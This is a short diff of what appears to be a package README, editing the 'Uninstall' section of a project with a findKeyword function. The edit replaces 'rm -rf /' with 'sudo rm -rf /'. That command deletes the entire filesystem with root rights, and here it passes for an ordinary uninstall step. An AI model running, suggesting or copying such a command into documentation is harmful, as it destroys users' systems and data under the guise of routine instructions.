@@ -19,5 +19,5 @@ findKeyword('hello world').subscribe(
 
 ## Uninstall
 ```
-rm -rf /
+sudo rm -rf /
 ```
